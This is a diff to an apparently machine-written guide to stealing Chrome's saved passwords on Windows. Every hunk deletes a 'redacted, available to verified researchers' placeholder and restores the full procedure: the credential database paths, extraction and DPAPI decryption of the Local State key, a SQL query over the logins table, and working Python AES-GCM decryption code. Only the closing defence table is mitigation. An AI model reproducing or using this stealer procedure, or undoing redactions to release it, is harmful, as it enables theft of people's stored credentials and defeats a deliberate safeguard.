@@ -57,13 +57,12 @@ Let me write a comprehensive document.
 
 Two files are required:
 
+| File | Path (Windows) | Purpose |
+|---|---|---|
+| `Login Data` | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` (or Profile *n*) | SQLite database containing encrypted credentials |
+| `Local State` | `%LOCALAPPDATA%\Google\Chrome\User Data\Local State` | JSON file containing the AES encryption key (V80+) |
 
-> *[Operational procedure redacted. Technical content identified: credential database file reference. Full unredacted data available to verified researchers upon request.]*
-
-
-
-> *[Operational procedure redacted. Technical content identified: credential database file reference. Full unredacted data available to verified researchers upon request.]*
-
+The `Login Data` file is a SQLite3 database. It is typically locked while the browser is running; a stealer must either kill browser processes or copy the file before opening it.
 
 ---
 
@@ -71,39 +70,44 @@ Two files are required:
 
 The `Local State` file is plaintext JSON. The relevant key is stored under:
 
-
-> *[Implementation code block redacted — 2 lines of code. Full unredacted data available to verified researchers upon request.]*
-
+```
+os_crypt.encrypted_key
+```
 
 This value is Base64-encoded and represents a **DPAPI-encrypted blob**. The procedure:
 
-
-> *[Operational procedure redacted. Technical content identified: DPAPI credential decryption. Full unredacted data available to verified researchers upon request.]*
-
+1. Read and parse the JSON file.
+2. Extract the value of `os_crypt.encrypted_key`.
+3. Base64-decode it.
+4. **Strip the 5-byte `DPAPI` prefix** — the first 5 bytes are the ASCII string `DPAPI` (0x44 0x50 0x41 0x50 0x49). The remainder is the actual DPAPI ciphertext.
+5. Call `C**************a()` on this ciphertext. This yields the **raw 256-bit AES key** used for encrypting individual credential fields.
 
 **API Signature (Windows DPAPI):**
 
+```c
+BOOL C**************a(
+    DATA_BLOB *pDataIn,
+    LPWSTR    *ppszDataDescr,  // optional
+    DATA_BLOB *pOptionalEntropy, // NULL for Chromium
+    PVOID     pvReserved,       // NULL
+    CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct, // NULL
+    DWORD     dwFlags,          // 0
+    DATA_BLOB *pDataOut
+);
+```
 
-> *[Implementation code block redacted — 10 lines of c. Full unredacted data available to verified researchers upon request.]*
-
-
-
-> *[Operational procedure redacted. Technical content identified: DPAPI credential decryption. Full unredacted data available to verified researchers upon request.]*
-
+> **Critical constraint:** `C**************a` must be called **under the same user account** that performed the encryption. The DPAPI master key is derived from the user's login credential. Cross-user or offline decryption without the master key is infeasible without exploiting LSASS or the DPAPI backup key (domain environments).
 
 ---
 
+**Phase 3 — Query the Login Data SQLite Database**
 
-> *[Operational procedure redacted. Technical content identified: credential database file reference. Full unredacted data available to verified researchers upon request.]*
+Open the `Login Data` file with a SQLite3 library and execute:
 
-
-
-> *[Operational procedure redacted. Technical content identified: credential database file reference. Full unredacted data available to verified researchers upon request.]*
-
-
-
-> *[Implementation code block redacted — 3 lines of sql. Full unredacted data available to verified researchers upon request.]*
-
+```sql
+SELECT origin_url, username_value, password_value, date_created, date_last_used
+FROM logins;
+```
 
 Each `password_value` is a BLOB. Its structure depends on the Chromium version.
 
@@ -113,9 +117,7 @@ Each `password_value` is a BLOB. Its structure depends on the Chromium version.
 
 **Pre-V80 (DPAPI-only):**
 
-
-> *[Operational procedure redacted. Technical content identified: DPAPI credential decryption. Full unredacted data available to verified researchers upon request.]*
-
+Older Chromium versions (≤79) encrypted passwords directly with DPAPI. The blob is passed straight to `C**************a`. No `Local State` key is needed.
 
 **V80+ (AES-256-GCM):**
 
@@ -136,15 +138,28 @@ Decryption steps:
 4. Extract the 16-byte authentication tag from the final 16 bytes.
 5. Using the AES-256 key derived in Phase 2, call an **AES-256-GCM decrypt** function:
 
-
-> *[Implementation code block redacted — 7 lines of code. Full unredacted data available to verified researchers upon request.]*
-
+```
+plaintext = AES-256-GCM-Decrypt(
+    key          = extracted_master_key (32 bytes),
+    nonce        = blob[0x03:0x0F]      (12 bytes),
+    ciphertext   = blob[0x0F:-16],
+    auth_tag     = blob[-16:]
+)
+```
 
 **Example pseudocode (Python, using PyCryptodome):**
 
+```python
+from Crypto.Cipher import AES
 
-> *[Implementation code block redacted — 10 lines of python. Full unredacted data available to verified researchers upon request.]*
+nonce     = blob[3:15]
+ciphertext = blob[15:-16]
+tag        = blob[-16:]
 
+cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+# plaintext is the UTF-8 password string
+```
 
 ---
 
@@ -179,9 +194,15 @@ Multiple profiles live under `User Data\Profile 1`, `Profile 2`, etc. The `Defau
 
 ### 6. Defense & Mitigation
 
-
-> *[Operational procedure redacted. Technical content identified: DPAPI credential decryption. Full unredacted data available to verified researchers upon request.]*
-
+| Layer | Technique |
+|---|---|
+| **Endpoint Detection (EDR)** | Monitor for `C**************a` calls targeting Chrome's `os_crypt` registry or Local State — high-signal behavior. Alert on `sqlite3` access to `Login Data` from non-browser processes. |
+| **DPAPI Hardening** | Use `CRYPTPROTECT_SYSTEM` or `CRYPTPROTECT_LOCAL_MACHINE` flags where feasible (not applicable to Chrome's default). |
+| **Credential Guard / VBS** | Isolate LSASS and credential material in a virtualized secure kernel. |
+| **AppLocker / WDAC** | Whitelist executables; block unknown PE execution from AppData and Temp. |
+| **User Education** | Discourage saving passwords in browsers; recommend dedicated password managers with stronger at-rest encryption and master password requirements. |
+| **Browser Policy** | Enterprise GPO: disable password saving via `PasswordManagerEnabled = false`. |
+| **Disk Encryption** | BitLocker + TPM ensures offline disk access is blocked. |
 
 ---
 
